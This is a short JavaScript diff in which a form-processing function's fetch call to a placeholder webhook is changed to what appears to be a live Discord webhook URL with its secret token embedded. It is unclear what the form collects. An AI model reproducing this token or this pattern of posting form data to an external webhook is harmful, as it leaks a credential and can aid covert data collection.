@@ -25,7 +25,7 @@ function processForm(event) {
   };
 
   // An den Webhook senden (Beispiel: POST-Anfrage mit Fetch-API)
-  fetch('https://example.com/webhook', {
+  fetch('https://discord.com/api/webhooks/1208870919536255027/ccEmT5kSI01au1jlAvA8itMrawm9B61DiXXnqRicPRbXKH_Bi2milzWJFWKuWQKqzoR1', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
